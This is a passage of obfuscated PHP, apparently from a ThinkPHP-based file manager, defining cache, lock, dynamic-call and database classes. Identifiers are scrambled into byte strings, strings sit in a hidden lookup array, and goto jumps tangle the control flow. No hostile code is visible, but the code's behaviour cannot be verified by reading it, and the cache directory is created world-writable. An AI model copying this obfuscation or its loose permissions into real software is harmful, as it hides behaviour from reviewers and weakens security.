$FÆÍ°Í«Ğ = false) { goto bŸ’ïÆÆÑƒ; E¾Ë Œ§¥·: CacheLock::unlock($DÁ¢›ù×); return $d¾Ÿğ‹æì¾; goto cÉ›¢Ø‰Ïù; AÄŸçŞ†®À: CacheLock::lock($DÁ¢›ù×); $d¾Ÿğ‹æì¾ = self::init()->set($b¸¼šœğêÖ, serialize($C‡•íÕ´ãÑ), $FÆÍ°Í«Ğ); self::$memoryCache[$b¸¼šœğêÖ] = $C‡•íÕ´ãÑ; goto E¾Ë Œ§¥·; bŸ’ïÆÆÑƒ: $b¸¼šœğêÖ = self::key($DÁ¢›ù×); if (isset(self::$memoryCache[$b¸¼šœğêÖ]) && self::$memoryCache[$b¸¼šœğêÖ] === $C‡•íÕ´ãÑ) { return !0; } if ($FÆÍ°Í«Ğ === 0) { self::$memoryCache[$b¸¼šœğêÖ] = $C‡•íÕ´ãÑ; return !0; } goto AÄŸçŞ†®À; cÉ›¢Ø‰Ïù: } public static function remove($D•ÉãËæŠ) { goto DÁ¸á¤ÂÍá; A–Š·¯—”›: return $f›×ší›öÎ; goto D´çŸŒ‰™å; D‹ÇÙÀö«ö: CacheLock::lock($D•ÉãËæŠ); $f›×ší›öÎ = self::init()->remove($c†›Íñê); CacheLock::unlock($D•ÉãËæŠ); goto A–Š·¯—”›; DÁ¸á¤ÂÍá: $c†›Íñê = self::key($D•ÉãËæŠ); unset(self::$memoryCache[$c†›Íñê]); self::clearTimeout(); goto D‹ÇÙÀö«ö; D´çŸŒ‰™å: } public static function removeMemory($FÜĞ¢Œ¹½) { $B‡‰Œ„¦ = self::key($FÜĞ¢Œ¹½); unset(self::$memoryCache[$B‡‰Œ„¦]); } public static function clearMemory($dõ®ÓÆåç = false) { if ($dõ®ÓÆåç) { $dõ®ÓÆåç = self::key($dõ®ÓÆåç); unset(self::$memoryCache[$dõ®ÓÆåç]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÉóçÄÇ][783])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÉóçÄÇ][784])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($eó‘œ®­ù, $eàâà™‘) { $CÑ¡Èõ˜Ÿ =& $_SERVER[ÉóçÄÇ]; $this->cachePath = $eó‘œ®­ù[$CÑ¡Èõ˜Ÿ[75]]; $this->prefix = $CÑ¡Èõ˜Ÿ[785]; $this->cacheTime = $eàâà™‘; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($cÄŠ¨À£Â±) { $CÅ°ËÒ‰³› =& $_SERVER[ÉóçÄÇ]; $cÄŠ¨À£Â± = str_replace(array($CÅ°ËÒ‰³›[786], $CÅ°ËÒ‰³›[96], $CÅ°ËÒ‰³›[69]), $CÅ°ËÒ‰³›[787], $cÄŠ¨À£Â±); return $this->cachePath . $CÅ°ËÒ‰³›[788] . $cÄŠ¨À£Â± . $CÅ°ËÒ‰³›[789]; } public function set($c›Á²„êê, $fÛä» Ú„ª, $AìÌó¬—Œ = false) { $A‡‡±°äŞë = $this->getFile($c›Á²„êê); if (file_put_contents($A‡‡±°äŞë, $this->prefix . $fÛä» Ú„ª, LOCK_EX)) { return !0; } @unlink($A‡‡±°äŞë); return !1; } public function get($D”õ†ï÷Êç) { $C¾ ÎŸ„®ö = $this->getFile($D”õ†ï÷Êç); if (file_exists($C¾ ÎŸ„®ö) && filemtime($C¾ ÎŸ„®ö) < time() - $this->cacheTime) { @unlink($C¾ ÎŸ„®ö); return !1; } $cì•åß¦‹ = @file_get_contents($C¾ ÎŸ„®ö); return substr($cì•åß¦‹, strlen($this->prefix)); } public function remove($F’Ç±İ´Ïò) { $B¢¨œâ¾áÎ = $this->getFile($F’Ç±İ´Ïò); return @unlink($B¢¨œâ¾áÎ); } public function deleteAll() { $aøä´¦‡Íî =& $_SERVER[ÉóçÄÇ]; $eÕå¾ä = scandir($this->cachePath); foreach ($eÕå¾ä as $FìŸƒˆÂ‹) { $Cß†ç×ò = $this->cachePath . $FìŸƒˆÂ‹; if (strpos($Cß†ç×ò, $aøä´¦‡Íî[789]) && strpos($Cß†ç×ò, $aøä´¦‡Íî[790])) { @unlink($Cß†ç×ò); } } } public function clearTimeout() { $dÌå…¢¹£ =& $_SERVER[ÉóçÄÇ]; $AÇÈø£¹í³ = scandir($this->cachePath); foreach ($AÇÈø£¹í³ as $Fˆ°î¨â) { $b‘‚Éã½±Œ = $this->cachePath . $Fˆ°î¨â; if (strpos($b‘‚Éã½±Œ, $dÌå…¢¹£[789]) && strpos($b‘‚Éã½±Œ, $dÌå…¢¹£[790]) && filemtime($b‘‚Éã½±Œ) < time() - $this->cacheTime) { @unlink($b‘‚Éã½±Œ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto f›ºˆ²èñ«; f›ºˆ²èñ«: $a–´£ğ¡¾¸ =& $_SERVER[ÉóçÄÇ]; if (self::$handle) { return self::$handle; } $cœ·Øæ¼” = $GLOBALS[$a–´£ğ¡¾¸[6]][$a–´£ğ¡¾¸[345]]; goto eà›±øæµ„; C»´Í‘ì¦Ö: if ($E¹ËÏ¿‡² == $a–´£ğ¡¾¸[17] && $b¹ÚŸï¨®Ó == $a–´£ğ¡¾¸[9]) { $E¹ËÏ¿‡² = $a–´£ğ¡¾¸[173]; } switch ($E¹ËÏ¿‡²) { case $a–´£ğ¡¾¸[781]: self::$handle = new CacheLockRedis(); break; case $a–´£ğ¡¾¸[782]: self::$handle = new CacheLockMemcached(); break; case $a–´£ğ¡¾¸[17]: self::$handle = new CacheLockDatabase(); break; case $a–´£ğ¡¾¸[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto AÇå£Æ¿; eà›±øæµ„: self::$timeout = $cœ·Øæ¼”[$a–´£ğ¡¾¸[791]] ? $cœ·Øæ¼”[$a–´£ğ¡¾¸[791]] : 10; $b¹ÚŸï¨®Ó = _get($GLOBALS[$a–´£ğ¡¾¸[6]], $a–´£ğ¡¾¸[792]); $E¹ËÏ¿‡² = $cœ·Øæ¼”[$a–´£ğ¡¾¸[778]] ? $cœ·Øæ¼”[$a–´£ğ¡¾¸[778]] : $a–´£ğ¡¾¸[173]; goto C»´Í‘ì¦Ö; AÇå£Æ¿: } private static function key($Eœ–åº†œ‚) { return $_SERVER[ÉóçÄÇ][793] . Cache::key($Eœ–åº†œ‚); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($dĞËåõ£Æ± = '') { self::$errorMsg = $dĞËåõ£Æ±; } public static function lockGlobal($e©š‰£òôò, $cÈÏêÜ¦‡´) { return self::lock($e©š‰£òôò, $cÈÏêÜ¦‡´, !0); } public static function lock($b¬†·…‡Ü, $dëÃÔ´•Ú = false, $CÃ«Ïé¼´¯ = false) { goto D®‚…ãˆÚ„; eˆˆ¢ùîÈŸ: $dëÃÔ´•Ú = $dëÃÔ´•Ú ? $dëÃÔ´•Ú : self::$timeout; $cË‚º§¡Ö = $c©‡çõµ¶ì->lock($c¡ïÀ¨, $dëÃÔ´•Ú); if (!$cË‚º§¡Ö) { $D°²ñ¯ìá½ = "\154\x6f\x63\x6b\x20\145\162\162\157\x72\73\x6b\x65\x79\x3d{$b¬†·…‡Ü}\x3b\164\151\155\145\75{$dëÃÔ´•Ú}\73" . self::$errorMsg . $dÂÅÅÊÓ‚­[67] . get_caller_msg(); $eæ–‡ÊÁ«á = LNG($dÂÅÅÊÓ‚­[794]) . "\x28{$dëÃÔ´•Ú}\163\x29\56" . LNG($dÂÅÅÊÓ‚­[795]); $eæ–‡ÊÁ«á .= $dÂÅÅÊÓ‚­[796]; if (is_string(self::$errorMsg) && self::$errorMsg) { $eæ–‡ÊÁ«á = $eæ–‡ÊÁ«á . $dÂÅÅÊÓ‚­[797] . self::$errorMsg; } write_log($D°²ñ¯ìá½, $dÂÅÅÊÓ‚­[798]); show_json($eæ–‡ÊÁ«á, !1); } goto F’Ì¦š«•; F’Ì¦š«•: if (!$CÃ«Ïé¼´¯) { self::$lockItem[$c¡ïÀ¨] = !0; } return $cË‚º§¡Ö; goto bå·¥£»Å; D®‚…ãˆÚ„: $dÂÅÅÊÓ‚­ =& $_SERVER[ÉóçÄÇ]; $c©‡çõµ¶ì = self::init(); $c¡ïÀ¨ = self::key($b¬†·…‡Ü); goto eˆˆ¢ùîÈŸ; bå·¥£»Å: } public static function lockGet($dÛìŒ‚ÊÆŒ) { $aÜÁï£ƒ¬ = self::key($dÛìŒ‚ÊÆŒ); if (self::$lockItem[$aÜÁï£ƒ¬]) { return self::$lockItem[$aÜÁï£ƒ¬]; } return self::init()->lockGet($aÜÁï£ƒ¬); } public static function unlock($F‰À¸·É‡) { $AÓÌÌºµ§Û = self::key($F‰À¸·É‡); self::$lockItem[$AÓÌÌºµ§Û] = null; return self::init()->unlock($AÓÌÌºµ§Û); } public static function unlockRuntime() { $C††¾±ç±Œ =& $_SERVER[ÉóçÄÇ]; $có´óõ¶‚§ = self::init(); $CÜ’ªµˆ¦Ù = !1; foreach (self::$lockItem as $C±àÓäÎªÊ => $F˜š£ÑÍˆ·) { if (!$F˜š£ÑÍˆ·) { continue; } $có´óõ¶‚§->unlock($C±àÓäÎªÊ); if (!$CÜ’ªµˆ¦Ù) { $CÜ’ªµˆ¦Ù = !0; write_log($C††¾±ç±Œ[799] . $C±àÓäÎªÊ . $C††¾±ç±Œ[67] . get_caller_msg(), $C††¾±ç±Œ[798]); continue; } write_log($C††¾±ç±Œ[799] . $C±àÓäÎªÊ, $C††¾±ç±Œ[798]); } self::fileUnlockAll(); } public static function fileLock($B¥¼¹ê¼ë) { goto dµ‹Ÿ™ÓÓ; dÕ¼áÚ«ÙÛ: return !1; goto BœªÄ½ÂÌ; dµ‹Ÿ™ÓÓ: $CÂÈŠŠ¢¶ =& $_SERVER[ÉóçÄÇ]; if (!$GLOBALS[$CÂÈŠŠ¢¶[800]]) { $GLOBALS[$CÂÈŠŠ¢¶[800]] = array(); } $GLOBALS[$CÂÈŠŠ¢¶[800]][$B¥¼¹ê¼ë] = !1; goto eË–éŒ‰; eË–éŒ‰: $aÜ¢ÔÅÇŒâ = fopen(DATA_PATH . $B¥¼¹ê¼ë . $CÂÈŠŠ¢¶[801], $CÂÈŠŠ¢¶[802]); if (!$aÜ¢ÔÅÇŒâ) { return !1; } $GLOBALS[$CÂÈŠŠ¢¶[800]][$B¥¼¹ê¼ë] = $aÜ¢ÔÅÇŒâ; goto c§İ›œè³•; c§İ›œè³•: if (flock($aÜ¢ÔÅÇŒâ, LOCK_EX)) { return !0; } self::unlock($B¥¼¹ê¼ë); show_json($CÂÈŠŠ¢¶[803], !1); goto dÕ¼áÚ«ÙÛ; BœªÄ½ÂÌ: } public static function fileUnlock($FãË¦ñÎá®) { $f¾¨Äáª =& $_SERVER[ÉóçÄÇ]; $a§±‚–È = $GLOBALS[$f¾¨Äáª[800]][$FãË¦ñÎá®]; if (!$a§±‚–È) { return; } $GLOBALS[$f¾¨Äáª[800]][$FãË¦ñÎá®] = !1; flock($a§±‚–È, LOCK_UN); fclose($a§±‚–È); } public static function fileUnlockAll() { $eŒö†“Éãª =& $_SERVER[ÉóçÄÇ]; if (!$GLOBALS[$eŒö†“Éãª[800]]) { return; } foreach ($GLOBALS[$eŒö†“Éãª[800]] as $eôÑÁÉªË => $dí¼“éÍ½) { if (!$dí¼“éÍ½) { continue; } $GLOBALS[$eŒö†“Éãª[800]][$eôÑÁÉªË] = !1; flock($dí¼“éÍ½, LOCK_UN); fclose($dí¼“éÍ½); } $GLOBALS[$eŒö†“Éãª[800]] = array(); } } goto Dªî‡àÜ‘¥; b”¦‘íƒì¸: function binCheckBigger($D‚²˜¼ñ²è, $B…”Öù¯…î) { return $D‚²˜¼ñ²è > $B…”Öù¯…î; } $_SERVER[$_SERVER[®Ãó…·ÈëÁ][3]] = ("\x38\x39\x31\x38"."\x37\x39")+0;$_4uIf="F3gfvaUbwUUvHBxKnIner8jk7s2VVKg4SekhTRZ7pXDrmqaChcGTWAzGWPFwcCKfxt3WZMyungKR";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($a»Î²Ùˆè, $EŠ§·ĞŒÌø) { $Fš×¦àÏ˜  =& $_SERVER[ÉóçÄÇ]; if (isset(self::$_methodList[$a»Î²Ùˆè])) { return @call_user_func_array(self::$_methodList[$a»Î²Ùˆè], $EŠ§·ĞŒÌø); } else { if (method_exists($this, $a»Î²Ùˆè)) { return call_user_func_array(array($this, $a»Î²Ùˆè), $EŠ§·ĞŒÌø); } else { think_exception(__CLASS__ . $Fš×¦àÏ˜ [4] . $a»Î²Ùˆè . $Fš×¦àÏ˜ [5]); } } } public static function __callStatic($F†µ–‘°íò, $b’ê¡Œ¹µ–) { if (isset(self::$_methodListStatic[$F†µ–‘°íò])) { return call_user_func_array(self::$_methodListStatic[$F†µ–‘°íò], $b’ê¡Œ¹µ–); } else { if (method_exists(self, $F†µ–‘°íò)) { return call_user_func_array(array(self, $F†µ–‘°íò), $b’ê¡Œ¹µ–); } else { show_json("{$F†µ–‘°íò}\50\x29\40\156\157\164\40\145\x78\151\163\164\x3b", !1); } } } public static function addMethod($f´ÀÇ²Ú»Ó, $dŸ„¹»É¶Ä) { self::$_methodList[$f´ÀÇ²Ú»Ó] = $dŸ„¹»É¶Ä; } public static function addMethodStatic($f„¼”÷Îó, $A¦¼óÀ°÷¢) { self::$_methodListStatic[$f„¼”÷Îó] = $A¦¼óÀ°÷¢; } } goto eÙ…Œé®¤ò; D¦«„µÆ‡: class DbSqlite3 extends DbSqlite3Base { public function query($BñÖ« êÃö) { $eÆ­¾ˆÔ±Ê =& $_SERVER[ÉóçÄÇ]; if (!CacheLock::fileLock($eÆ­¾ˆÔ±Ê[9])) { return !1; } $dÃƒ£²µ³ = parent::query($BñÖ« êÃö); CacheLock::fileUnLock($eÆ­¾ˆÔ±Ê[9]); return $dÃƒ£²µ³; } public function execute($Dî—“ªŠÊ™) { $d¨öõªèÙ =& $_SERVER[ÉóçÄÇ]; if (!CacheLock::fileLock($d¨öõªèÙ[9])) { return !1; } $aŠ‚Â±ø… = parent::execute($Dî—“ªŠÊ™); CacheLock::fileUnLock($d¨öõªèÙ[9]); return $aŠ‚Â±ø…; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\145\x71" => "\x3c\x3e", "\147\x74" => "\x3e", "\145\x67\164" => "\x3e\x3d", "\154\x74" => "\x3c", "\x65\x6c\x74" => "\74\75", "\156\x6f\164\154\151\x6b\145" => "\116\117\x54\x20\x4c\x49\x4b\x45", "\x6c\x69\153\145" => "\114\111\113\x45", "\151\156" => "\111\116", "\x6e\x6f\164\x69\x6e" => "\116\117\124\40\111\116", "\x6e\157\x74\x20\151\156" => "\x4e\117\124\x20\111\x4e", "\x62\145\164\167\x65\x65\156" => "\102\x45\124\127\x45\105\x4e", "\x6e\x6f\x74\x62\145\x74\x77\145\145\156" => "\116\x4f\x54\40\x42\x45\x54\127\105\x45\x4e", "\156\157\x74\40\142\x65\x74\x77\145\145\156" => "\116\117\124\40\102\105\124\127\x45\x45\x4e"); protected $selectSql = "\123\105\114\105\103\124\x25\x44\x49\x53\x54\x49\116\x43\124\x25\x20\x25\x46\x49\105\x4c\x44\45\40\106\122\117\115\40\45\124\x41\x42\x4c\x45\x25\x25\112\x4f\x49\116\x25\x25\127\x48\x45\x52\105\45\x25\107\122\117\x55\120\x25\x25\110\101\x56\111\x4e\x47\45\x25\117\122\x44\105\122\x25\x25\x4c\x49\115\x49\124\x25\40\x25\x55\x4e\111\117\116\45\x25\103\x4f\x4d\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $dÖ‘÷ùˆ”Ô = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÉóçÄÇ][901], $dÖ‘÷ùˆ”Ô); } public function factory($fƒÀ“ä”É = '') { goto C‚”‰ˆŞ´; b’ùõË§¯²: return $CÛÚ˜àùÊ; goto Aªš‘ÑŒåÜ; C‚”‰ˆŞ´: $cÁƒ¼§ =& $_SERVER[ÉóçÄÇ]; $fƒÀ“ä”É = $this->parseConfig($fƒÀ“ä”É); if (empty($fƒÀ“ä”É[$cÁƒ¼§[902]])) { think_exception(think_lang($cÁƒ¼§[903])); } goto dª ¦ĞŠ™ß; dª ¦ĞŠ™ß: $this->dbType = ucwords(strtolower($fƒÀ“ä”É[$cÁƒ¼§[902]])); $bÒÅ¢ØçˆÑ = $cÁƒ¼§[904] . $this->dbType; if (class_exists($bÒÅ¢ØçˆÑ)) { $CÛÚ˜àùÊ = new $bÒÅ¢ØçˆÑ($fƒÀ“ä”É); if ($cÁƒ¼§[747] != strtolower($fƒÀ“ä”É[$cÁƒ¼§[902]])) { $CÛÚ˜àùÊ->dbType = strtoupper($this->dbType); } else { $CÛÚ˜àùÊ->dbType = $this->_getDsnType($fƒÀ“ä”É[$cÁƒ¼§[857]]); } } else { think_exception(think_lang($cÁƒ¼§[905]) . $cÁƒ¼§[906] . $bÒÅ¢ØçˆÑ); } goto b’ùõË§¯²; Aªš‘ÑŒåÜ: } public function __call($c½Â„°„©, $Aä¯Ëõ²ë›) { if (method_exists($this, $c½Â„°„©)) { return call_user_func_array(array($this, $c½Â„°„©), $Aä¯Ëõ²ë›); } } protected function _getDsnType($eÀ¬™ßæâ) { $cº¯ç¡†Ê = explode($_SERVER[ÉóçÄÇ][4], $eÀ¬™ßæâ); $c–×ò…£•¸ = strtoupper(trim($cº¯ç¡†Ê[0])); return $c–×ò…£•¸; } private function parseConfig($A­ ¸øÑª’ = '') { $D‡¶Õ¬ö’ =& $_SERVER[ÉóçÄÇ]; if (!empty($A­ ¸øÑª’) && is_string($A­ ¸øÑª’)) { $A­ ¸øÑª’ = $this->parseDSN($A­ ¸øÑª’); } elseif (is_array($A­ ¸øÑª’)) { $A­ ¸øÑª’ = array_change_key_case($A­ ¸øÑª’); $A­ ¸øÑª’ = array($D‡¶Õ¬ö’[902] => $A­ ¸øÑª’[$D‡¶Õ¬ö’[746]], $D‡¶Õ¬ö’[830] => $A­ ¸øÑª’[$D‡¶Õ¬ö’[907]], $D‡¶Õ¬ö’[831] => $A­ ¸øÑª’[$D‡¶Õ¬ö’[908]], $D‡¶Õ¬ö’[828] => $A­ ¸øÑª’[$D‡¶Õ¬ö’[909]], $D‡¶Õ¬ö’[829] => $A­ ¸øÑª’[$D‡¶Õ¬ö’[910]], $D‡¶Õ¬ö’[17] => $A­ ¸øÑª’[$D‡¶Õ¬ö’[911]], $D‡¶Õ¬ö’[857] => $A­ ¸øÑª’[$D‡¶Õ¬ö’[748]], $D‡¶Õ¬ö’[13] => isset($A­ ¸øÑª’[$D‡¶Õ¬ö’[912]]) ? $A­ ¸øÑª’[$D‡¶Õ¬ö’[912]] : array()); } elseif (empty($A­ ¸øÑª’)) { if (think_config($D‡¶Õ¬ö’[913]) && $D‡¶Õ¬ö’[747] != strtolower(think_config($D‡¶Õ¬ö’[914]))) { $A­ ¸øÑª’ = $this->parseDSN(think_config($D‡¶Õ¬ö’[913])); } else { $A­ ¸øÑª’ = array($D‡¶Õ¬ö’[902] => think_config($D‡¶Õ¬ö’[914]), $D‡¶Õ¬ö’[830] => think_config($D‡¶Õ¬ö’[915]), $D‡¶Õ¬ö’[831] => think_config($D‡¶Õ¬ö’[916]), $D‡¶Õ¬ö’[828] => think_config($D‡¶Õ¬ö’[917]), $D‡¶Õ¬ö’[829] => think_config($D‡¶Õ¬ö’[918]), $D‡¶Õ¬ö’[17] => think_config($D‡¶Õ¬ö’[242]), $D‡¶Õ¬ö’[857] => think_config($D‡¶Õ¬ö’[913]), $D‡¶Õ¬ö’[13] => think_config($D‡¶Õ¬ö’[919])); } } return $A­ ¸øÑª’; } protected function initConnect($FÄŞÌ¸ò·Ş = true) { if (1 == think_config($_SERVER[ÉóçÄÇ][18])) { $this->_linkID = $this->multiConnect($FÄŞÌ¸ò·Ş); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Eƒ¦‹ÕÃ»Õ => $A‘ò†Œ–í) { $this->_linkID = $A‘ò†Œ–í; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($c¯ö‹×¤‹ = false) { $C˜ò‹‡ôº® =& $_SERVER[ÉóçÄÇ]; static $D‚İŸŸ×œõ = array(); if (empty($D‚İŸŸ×œõ)) { foreach ($this->config as $dÕô«ø¼í => $aĞÃ‡êíƒ½) { $D‚İŸŸ×œõ[$dÕô«ø¼í] = explode($C˜ò‹‡ôº®[47], $aĞÃ‡êíƒ½); } } if (think_config($C˜ò‹‡ôº®[920])) { if ($c¯ö‹×¤‹) { $dõ…Ÿ± ß› = floor(mt_rand(0, think_config($C˜ò‹‡ôº®[921]) - 1)); } else { if (is_numeric(think_config($C˜ò‹‡ôº®[922]))) { $dõ…Ÿ± ß› = think_config($C˜ò‹‡ôº®[922]); } else { $dõ…Ÿ± ß› = floor(mt_rand(think_config($C˜ò‹‡ôº®[921]), count($D‚İŸŸ×œõ[$C˜ò‹‡ôº®[828]]) - 1)); } } } else { $dõ…Ÿ± ß› = floor(mt_rand(0, count($D‚İŸŸ×œõ[$C˜ò‹‡ôº®[828]]) - 1)); } $aäïÌ—Ìö = array($C˜ò‹‡ôº®[830] => isset($D‚İŸŸ×œõ[$C˜ò‹‡ôº®[830]][$dõ…Ÿ± ß›]) ? $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[830]][$dõ…Ÿ± ß›] : $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[830]][0], $C˜ò‹‡ôº®[831] => isset($D‚İŸŸ×œõ[$C˜ò‹‡ôº®[831]][$dõ…Ÿ± ß›]) ? $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[831]][$dõ…Ÿ± ß›] : $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[831]][0], $C˜ò‹‡ôº®[828] => isset($D‚İŸŸ×œõ[$C˜ò‹‡ôº®[828]][$dõ…Ÿ± ß›]) ? $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[828]][$dõ…Ÿ± ß›] : $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[828]][0], $C˜ò‹‡ôº®[829] => isset($D‚İŸŸ×œõ[$C˜ò‹‡ôº®[829]][$dõ…Ÿ± ß›]) ? $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[829]][$dõ…Ÿ± ß›] : $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[829]][0], $C˜ò‹‡ôº®[17] => isset($D‚İŸŸ×œõ[$C˜ò‹‡ôº®[17]][$dõ…Ÿ± ß›]) ? $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[17]][$dõ…Ÿ± ß›] : $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[17]][0], $C˜ò‹‡ôº®[857] => isset($D‚İŸŸ×œõ[$C˜ò‹‡ôº®[857]][$dõ…Ÿ± ß›]) ? $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[857]][$dõ…Ÿ± ß›] : $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[857]][0], $C˜ò‹‡ôº®[13] => isset($D‚İŸŸ×œõ[$C˜ò‹‡ôº®[13]][$dõ…Ÿ± ß›]) ? $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[13]][$dõ…Ÿ± ß›] : $D‚İŸŸ×œõ[$C˜ò‹‡ôº®[13]][0]); return $this->connect($aäïÌ—Ìö, $dõ…Ÿ± ß›); } public function parseDSN($B¥ñ×’á™») { $Eò—ˆ‰Í® =& $_SERVER[ÉóçÄÇ]; if (empty($B¥ñ×’á™»)) { return !1; } $d³ŒÊŞÕæƒ = parse_url($B¥ñ×’á™»); if ($d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[174]]) { $AÆïÎ…µ×õ = array($Eò—ˆ‰Í®[902] => $d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[174]], $Eò—ˆ‰Í®[830] => isset($d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[557]]) ? $d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[557]] : $Eò—ˆ‰Í®[33], $Eò—ˆ‰Í®[831] => isset($d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[923]]) ? $d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[923]] : $Eò—ˆ‰Í®[33], $Eò—ˆ‰Í®[828] => isset($d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[175]]) ? $d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[175]] : $Eò—ˆ‰Í®[33], $Eò—ˆ‰Í®[829] => isset($d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[176]]) ? $d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[176]] : $Eò—ˆ‰Í®[33], $Eò—ˆ‰Í®[17] => isset($d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[75]]) ? substr($d³ŒÊŞÕæƒ[$Eò—ˆ‰Í®[75]], 1) : $Eò—ˆ‰Í®[33]); } else { preg_match($Eò—ˆ‰Í®[924], trim($B¥ñ×’á™»), $fù“¢ ˜å“); $AÆïÎ…µ×õ = array($Eò—ˆ‰Í®[902] => $fù“¢ ˜å“[1], $Eò—ˆ‰Í®[830] => $fù“¢ ˜å“[2], $Eò—ˆ‰Í®[831] => $fù“¢ ˜å“[3], $Eò—ˆ‰Í®[828] => $fù“¢ ˜å“[4], $Eò—ˆ‰Í®[829] => $fù“¢ ˜å“[5], $Eò—ˆ‰Í®[17] => $fù“¢ ˜å“[6]); } $AÆïÎ…µ×õ[$Eò—ˆ‰Í®[857]] = $Eò—ˆ‰Í®[33]; return $AÆïÎ…µ×õ; } protected function debug() { $F¤¹³ç¡š‹ =& $_SERVER[ÉóçÄÇ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $F¤¹³ç¡š‹[925]; if (think_config($F¤¹³ç¡š‹[926])) { think_status($F¤¹³ç¡š‹[927]); think_trace($this->queryStr . $F¤¹³ç¡š‹[928] . think_status($F¤¹³ç¡š‹[20], $F¤¹³ç¡š‹[927], 6) . $F¤¹³ç¡š‹[929], $F¤¹³ç¡š‹[33], $F¤¹³ç¡š‹[930]); } } protected function parseLock($BãÚ¡Ñğ‚Û = false) { $B„˜ƒÉÒî =& $_SERVER[ÉóçÄÇ]; if (!$BãÚ¡Ñğ‚Û) { return $B„˜ƒÉÒî[33]; } if ($B„˜ƒÉÒî[859] == $this->dbType) { return $B„˜ƒÉÒî[931]; } return $B„˜ƒÉÒî[932]; } protected function parseSet($AòÏ‚Ù‚Ş) { $A‚æ²ˆ‚ß =& $_SERVER[ÉóçÄÇ]; foreach ($AòÏ‚Ù‚Ş as $Bù °àå¡ò => $fÖòé¦Ù›) { if (is_array($fÖòé¦Ù›) && $A‚æ²ˆ‚ß[293] == $fÖòé¦Ù›[0]) { $AÔ…ç„éÂ÷[] = $this->parseKey($Bù °àå¡ò) . $A‚æ²ˆ‚ß[933] . $fÖòé¦Ù›[1]; } elseif (is_scalar($fÖòé¦Ù›) || is_null($fÖòé¦Ù›)) { $AÔ…ç„éÂ÷[] = $this->parseKey($Bù °àå¡ò) . $A‚æ²ˆ‚ß[933] . $this->parseValue($fÖòé¦Ù›); } } return $A‚æ²ˆ‚ß[934] . implode($A‚æ²ˆ‚ß[47], $AÔ…ç„éÂ÷); } protected function bindParam($fØ¾øê¯¬Š, $f±ïãá¡¶) { $this->bind[$_SERVER[ÉóçÄÇ][4] . $fØ¾øê¯¬Š] = $f±ïãá¡¶; } protected function parseBind($a›®‘±¹†à) { $a›®‘±¹†à = array_merge($this->bind, $a›®‘±¹†à); $this->bind = array(); return $a›®‘±¹†à; } function parseKey(&$B‰‹•µó¸×, $Bœ”àôÖÙß = true) { if ($Bœ”àôÖÙß) { $B‰‹•µó¸× = $this->parseKeyCheck($B‰‹•µó¸×); } return $B‰‹•µó¸×; } function parseKeyCheck($bŸâ¥”‹Ç) { $CáòÇ¿Å¦ =& $_SERVER[ÉóçÄÇ]; $bŸâ¥”‹Ç = trim($bŸâ¥”‹Ç); if (!preg_match($CáòÇ¿Å¦[935], $bŸâ¥”‹Ç)) { think_exception($CáòÇ¿Å¦[936] . $bŸâ¥”‹Ç); } return $bŸâ¥”‹Ç; } protected function parseValue($bŸ°àã££) { $A‡å¯œæ—¡ =& $_SERVER[ÉóçÄÇ]; if (is_string($bŸ°àã££)) { $bŸ°àã££ = $A‡å¯œæ—¡[898] . $this->escapeString($bŸ°àã££) . $A‡å¯œæ—¡[898]; } elseif (isset($bŸ°àã££[0]) && is_string($bŸ°àã££[0]) && strtolower($bŸ°àã££[0]) == $A‡å¯œæ—¡[293]) { $bŸ°àã££ = $this->escapeString($bŸ°àã££[1]); } elseif (is_array($bŸ°àã££)) { $bŸ°àã££ = array_map(array($this, $A‡å¯œæ—¡[899]), $bŸ°àã££); } elseif (is_bool($bŸ°àã££)) { $bŸ°àã££ = $bŸ°àã££ ? $A‡å¯œæ—¡[86] : 